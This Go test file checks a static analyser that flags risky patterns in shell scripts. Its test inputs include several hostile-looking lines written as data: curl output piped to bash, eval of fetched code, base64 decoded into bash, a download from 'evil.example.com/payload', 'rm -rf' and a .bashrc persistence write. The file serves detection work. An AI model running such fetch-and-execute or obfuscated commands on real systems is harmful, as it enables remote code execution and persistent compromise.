package staticanalysis

import (
	"testing"
)

// hasCategory reports whether the report contains at least one finding in c.
func hasCategory(r *Report, c Category) bool {
	for _, f := range r.Findings {
		if f.Category == c {
			return true
		}
	}
	return false
}

func countCategory(r *Report, c Category) int {
	n := 0
	for _, f := range r.Findings {
		if f.Category == c {
			n++
		}
	}
	return n
}

func analyze(t *testing.T, src string) *Report {
	t.Helper()
	r, err := Analyze([]byte(src))
	if err != nil {
		t.Fatalf("Analyze error: %v", err)
	}
	return r
}

// --- Network calls ---

func TestNetwork_Curl(t *testing.T) {
	r := analyze(t, "#!/bin/bash\ncurl -fsSL https://example.com/x.sh\n")
	if !hasCategory(r, Network) {
		t.Error("expected network finding for curl")
	}
}

func TestNetwork_Wget(t *testing.T) {
	r := analyze(t, "#!/bin/bash\nwget -O - https://example.com/x\n")
	if !hasCategory(r, Network) {
		t.Error("expected network finding for wget")
	}
}

func TestNetwork_NoneForPlainScript(t *testing.T) {
	r := analyze(t, "#!/bin/bash\necho hello\nx=1\n")
	if hasCategory(r, Network) {
		t.Error("did not expect network finding")
	}
}

// --- URLs ---

func TestURL_Extracted(t *testing.T) {
	r := analyze(t, "#!/bin/bash\ncurl https://github.com/foo/bar.sh\n")
	if !hasCategory(r, URL) {
		t.Error("expected URL finding")
	}
	found := false
	for _, f := range r.Findings {
		if f.Category == URL && f.Detail == "https://github.com/foo/bar.sh" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected exact URL in detail, got %+v", r.Findings)
	}
}

func TestURL_InVariableAssignment(t *testing.T) {
	// AST advantage over grep: URL in an assignment is still found.
	r := analyze(t, "#!/bin/bash\nURL=https://evil.example.com/payload\ncurl \"$URL\"\n")
	if !hasCategory(r, URL) {
		t.Error("expected URL finding from variable assignment")
	}
}

// --- File writes ---

func TestFileWrite_Redirect(t *testing.T) {
	r := analyze(t, "#!/bin/bash\necho data > /usr/local/bin/tool\n")
	if !hasCategory(r, FileWrite) {
		t.Error("expected file-write finding for redirect")
	}
}

func TestFileWrite_IgnoresDevNull(t *testing.T) {
	// AST advantage: /dev/null and fd redirects are not file writes.
	r := analyze(t, "#!/bin/bash\necho noise > /dev/null\nls 2>&1\n")
	if hasCategory(r, FileWrite) {
		t.Errorf("did not expect file-write for /dev/null or fd redirect, got %+v", r.Findings)
	}
}

func TestFileWrite_Commands(t *testing.T) {
	for _, cmd := range []string{
		"cp a b", "mv a b", "mkdir -p /opt/x", "install -m755 a /usr/bin/a", "touch /tmp/x",
	} {
		r := analyze(t, "#!/bin/bash\n"+cmd+"\n")
		if !hasCategory(r, FileWrite) {
			t.Errorf("expected file-write for %q", cmd)
		}
	}
}

// --- Package installs ---

func TestPackageInstall(t *testing.T) {
	for _, cmd := range []string{
		"apt-get install -y foo", "apt install foo", "yum install foo",
		"brew install foo", "pip install foo", "pip3 install foo",
		"npm install -g foo", "dnf install foo",
	} {
		r := analyze(t, "#!/bin/bash\n"+cmd+"\n")
		if !hasCategory(r, PackageInstall) {
			t.Errorf("expected package-install for %q", cmd)
		}
	}
}

func TestPackageInstall_NotForNonInstall(t *testing.T) {
	r := analyze(t, "#!/bin/bash\napt-get update\nnpm run build\n")
	if hasCategory(r, PackageInstall) {
		t.Error("did not expect package-install for update/run")
	}
}

// --- Privilege escalation ---

func TestPrivEsc_Sudo(t *testing.T) {
	r := analyze(t, "#!/bin/bash\nsudo rm /etc/foo\n")
	if !hasCategory(r, PrivEsc) {
		t.Error("expected priv-esc for sudo")
	}
}

func TestPrivEsc_Chmod(t *testing.T) {
	r := analyze(t, "#!/bin/bash\nchmod a+x /usr/local/bin/tool\n")
	if !hasCategory(r, PrivEsc) {
		t.Error("expected priv-esc for chmod")
	}
}

// --- Persistence ---

func TestPersistence_ShellProfile(t *testing.T) {
	r := analyze(t, "#!/bin/bash\necho 'export PATH=$PATH:/x' >> ~/.bashrc\n")
	if !hasCategory(r, Persistence) {
		t.Error("expected persistence finding for .bashrc write")
	}
}

func TestPersistence_Crontab(t *testing.T) {
	r := analyze(t, "#!/bin/bash\ncrontab -l\n")
	if !hasCategory(r, Persistence) {
		t.Error("expected persistence finding for crontab")
	}
}

// --- Dangerous ops ---

func TestDangerous_RmRf(t *testing.T) {
	r := analyze(t, "#!/bin/bash\nrm -rf /tmp/build\n")
	if !hasCategory(r, Dangerous) {
		t.Error("expected dangerous finding for rm -rf")
	}
}

func TestDangerous_PlainRmNotFlagged(t *testing.T) {
	r := analyze(t, "#!/bin/bash\nrm /tmp/onefile\n")
	if hasCategory(r, Dangerous) {
		t.Error("plain rm without -rf should not be dangerous")
	}
}

// --- Obfuscation ---

func TestObfuscation_Eval(t *testing.T) {
	r := analyze(t, "#!/bin/bash\neval \"$(curl -s https://x.com)\"\n")
	if !hasCategory(r, Obfuscation) {
		t.Error("expected obfuscation finding for eval")
	}
}

func TestObfuscation_Base64(t *testing.T) {
	r := analyze(t, "#!/bin/bash\necho aGk= | base64 -d | bash\n")
	if !hasCategory(r, Obfuscation) {
		t.Error("expected obfuscation finding for base64")
	}
}

// --- Comments are not commands (AST advantage) ---

func TestComments_NotFlagged(t *testing.T) {
	r := analyze(t, "#!/bin/bash\n# this script does NOT curl anything or sudo\necho ok\n")
	if hasCategory(r, Network) || hasCategory(r, PrivEsc) {
		t.Errorf("comments should not produce findings, got %+v", r.Findings)
	}
}

// --- Line numbers ---

func TestFinding_LineNumber(t *testing.T) {
	r := analyze(t, "#!/bin/bash\necho one\ncurl https://x.com\n")
	for _, f := range r.Findings {
		if f.Category == Network {
			if f.Line != 3 {
				t.Errorf("expected curl on line 3, got %d", f.Line)
			}
			return
		}
	}
	t.Error("no network finding to check line number")
}

// --- Parse errors ---

func TestAnalyze_ParseError(t *testing.T) {
	// Unterminated quote — not valid shell.
	_, err := Analyze([]byte("#!/bin/bash\necho \"unterminated\n"))
	if err == nil {
		t.Error("expected parse error for malformed script")
	}
}

func TestAnalyze_Empty(t *testing.T) {
	r, err := Analyze([]byte(""))
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Findings) != 0 {
		t.Errorf("expected no findings for empty input, got %+v", r.Findings)
	}
}

// --- Category labels ---

func TestCategory_String(t *testing.T) {
	cases := map[Category]string{
		Network:        "Network call",
		URL:            "URL",
		FileWrite:      "File write",
		PackageInstall: "Package install",
		PrivEsc:        "Privilege escalation",
		Persistence:    "Persistence",
		Dangerous:      "Dangerous operation",
		Obfuscation:    "Obfuscation",
		Category(999):  "Unknown",
	}
	for c, want := range cases {
		if got := c.String(); got != want {
			t.Errorf("Category(%d).String() = %q, want %q", int(c), got, want)
		}
	}
}

// --- Summary helpers ---

func TestReport_Categories(t *testing.T) {
	r := analyze(t, "#!/bin/bash\ncurl https://x.com | bash\nsudo chmod +x /a\n")
	cats := r.Categories()
	if len(cats) == 0 {
		t.Error("expected non-empty categories")
	}
	if !hasCategory(r, Network) || !hasCategory(r, PrivEsc) {
		t.Error("expected network and priv-esc")
	}
}

func TestReport_Count(t *testing.T) {
	r := analyze(t, "#!/bin/bash\ncurl https://a.com\ncurl https://b.com\n")
	if countCategory(r, Network) != 2 {
		t.Errorf("expected 2 network findings, got %d", countCategory(r, Network))
	}
}
